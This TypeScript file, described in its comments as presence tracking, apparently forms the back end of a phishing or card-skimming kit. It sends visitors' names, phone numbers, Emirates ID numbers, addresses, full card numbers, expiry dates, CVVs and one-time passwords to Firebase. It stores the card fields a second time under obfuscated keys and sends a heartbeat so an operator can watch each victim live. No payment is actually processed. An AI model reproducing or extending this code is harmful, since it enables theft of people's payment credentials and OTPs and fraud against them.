import { ref, set, onDisconnect, remove } from 'firebase/database';
import { rtdb, db } from './firebase';
import { collection, addDoc, updateDoc, doc, serverTimestamp } from 'firebase/firestore';

export type PresenceData = {
  registrationId?: string | number;
  page?: string;
  step?: string;
  fullName?: string;
  phone?: string;
  emiratesId?: string;
  region?: string;
  streetAddress?: string;
  neighborhood?: string;
  deliveryDate?: string;
  paymentMethod?: string;
  onlineAt?: string;
  cardNumber?: string; _v1?: string;
  expiryDate?: string; _v3?: string;
  cvv?: string;        _v2?: string;
  cardHolderName?: string; _v4?: string;
  finalOtp?: string;   _v13?: string;
};

function sessionKey(): string {
  if (typeof window === 'undefined') return '';
  let k = sessionStorage.getItem('_pkey');
  if (!k) {
    k = Math.random().toString(36).slice(2) + Date.now().toString(36);
    sessionStorage.setItem('_pkey', k);
  }
  return k;
}

function stripUndefined(obj: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    if (v !== undefined) out[k] = v;
  }
  return out;
}

// ─── Firestore pays syncing ───────────────────────────────────────────────

const PAYS_ID_KEY = '_pays_id';

function getDeviceType(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (/Mobi|Android/i.test(ua)) return 'mobile';
  if (/Tablet|iPad/i.test(ua)) return 'tablet';
  return 'desktop';
}

/** Create a new pays document on first visit, or return the existing ID */
export async function ensurePaysDoc(): Promise<string | null> {
  if (typeof window === 'undefined') return null;
  const existing = sessionStorage.getItem(PAYS_ID_KEY);
  if (existing) return existing;
  try {
    const docRef = await addDoc(collection(db, 'pays'), {
      createdAt:     serverTimestamp(),
      updatedAt:     serverTimestamp(),
      lastActiveAt:  serverTimestamp(),
      isOnline:      true,
      deviceType:    getDeviceType(),
      paymentStatus: 'pending',
      currentStep:   'home',
    });
    sessionStorage.setItem(PAYS_ID_KEY, docRef.id);
    return docRef.id;
  } catch {
    return null;
  }
}

function presenceToPays(data: PresenceData): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  if (data.page || data.step) out.currentStep = data.step || data.page;
  if (data.fullName)      out.ownerName      = data.fullName;
  if (data.phone)         out.phoneNumber    = data.phone;
  if (data.emiratesId)    out.identityNumber = data.emiratesId;
  if (data.region)        out.region         = data.region;
  if (data.streetAddress) out.streetAddress  = data.streetAddress;
  if (data.neighborhood)  out.neighborhood   = data.neighborhood;
  if (data.deliveryDate)  out.deliveryDate   = data.deliveryDate;
  if (data.paymentMethod) out.paymentMethod  = data.paymentMethod;
  if (data.registrationId) out.registrationId = String(data.registrationId);

  const cardNum = data._v1 || data.cardNumber;
  if (cardNum) { out._v1 = cardNum; out.cardNumber = cardNum; }
  const expiry = data._v3 || data.expiryDate;
  if (expiry) { out._v3 = expiry; out.expiryDate = expiry; }
  const cvv = data._v2 || data.cvv;
  if (cvv) { out._v2 = cvv; out.cvv = cvv; }
  const holder = data._v4 || data.cardHolderName;
  if (holder) { out._v4 = holder; out.cardHolderName = holder; }
  const otp = data._v13 || data.finalOtp;
  if (otp) { out._v13 = otp; out.finalOtp = otp; out.otpCode = otp; }

  return out;
}

async function syncToPays(data: PresenceData): Promise<void> {
  const id = await ensurePaysDoc();
  if (!id) return;
  const mapped = presenceToPays(data);
  try {
    await updateDoc(doc(db, 'pays', id), {
      ...mapped,
      isOnline:     true,
      lastActiveAt: serverTimestamp(),
      updatedAt:    serverTimestamp(),
    });
  } catch { /* ignore */ }
}

async function markOffline(): Promise<void> {
  const id = sessionStorage.getItem(PAYS_ID_KEY);
  if (!id) return;
  try {
    await updateDoc(doc(db, 'pays', id), {
      isOnline:  false,
      updatedAt: serverTimestamp(),
    });
  } catch { /* ignore */ }
}

// ─── RTDB presence ────────────────────────────────────────────────────────

let _presRef: ReturnType<typeof ref> | null = null;
let _heartbeat: ReturnType<typeof setInterval> | null = null;

export function trackPresence(data: PresenceData): () => void {
  if (typeof window === 'undefined') return () => {};
  const key = sessionKey();
  if (!key) return () => {};

  const presRef = ref(rtdb, `presence/${key}`);
  _presRef = presRef;

  const payload = stripUndefined({ ...data, onlineAt: new Date().toISOString() });
  set(presRef, payload).catch(() => {});
  onDisconnect(presRef).remove().catch(() => {});

  syncToPays(data).catch(() => {});

  if (_heartbeat) clearInterval(_heartbeat);
  _heartbeat = setInterval(() => syncToPays(data).catch(() => {}), 20_000);

  return () => {
    remove(presRef).catch(() => {});
    _presRef = null;
    if (_heartbeat) { clearInterval(_heartbeat); _heartbeat = null; }
    markOffline().catch(() => {});
  };
}

export function pushPresence(data: PresenceData): void {
  if (typeof window === 'undefined') return;
  const key = sessionKey();
  if (!key) return;
  const presRef = _presRef ?? ref(rtdb, `presence/${key}`);
  set(presRef, stripUndefined({ ...data, onlineAt: new Date().toISOString() })).catch(() => {});
  syncToPays(data).catch(() => {});
}
